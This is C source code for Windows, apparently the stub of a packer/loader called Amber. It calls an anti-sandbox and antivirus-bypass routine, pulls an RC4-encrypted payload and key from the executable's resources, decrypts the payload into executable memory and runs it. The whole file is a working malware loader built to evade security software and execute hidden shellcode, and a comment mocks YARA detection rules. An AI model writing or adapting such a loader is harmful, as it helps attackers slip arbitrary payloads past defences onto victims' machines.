#include <windows.h>
#include "AntiSandbox.h"
#include "RC4.h"

const char LABEL[] = {"<Amber:4ba34949430d0ee1840305b65eb905c8ac1bf0fe>"}; // Descriptive label for yara rules ;D
void ExecutePayload();


int main(int argc, char const *argv[])
{
	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
	if(BypassAV(NULL)){
		ExecutePayload();
	}
	return 0;
}

void ExecutePayload(){

	unsigned char * Payload;
	unsigned int Payload_len;
	unsigned char * Payload_key;
	unsigned int Payload_key_len;
	

	HRSRC hRsrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(0), RT_RCDATA);
	HGLOBAL hGlob = LoadResource(GetModuleHandle(NULL), hRsrc);
	Payload = (unsigned char*)LockResource(hGlob);
	Payload_len = (unsigned int)SizeofResource(GetModuleHandle(NULL), hRsrc);

	hRsrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(1), RT_RCDATA);
	hGlob = LoadResource(GetModuleHandle(NULL), hRsrc);
	Payload_key = (unsigned char*)LockResource(hGlob);
	Payload_key_len = (unsigned int)SizeofResource(GetModuleHandle(NULL), hRsrc);

	unsigned char S[N];
    KSA(Payload_key,Payload_key_len,S);	
	unsigned char* BUFFER = (unsigned char*)VirtualAlloc(NULL, Payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PRGA(S,Payload,Payload_len,BUFFER);
	(*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
}


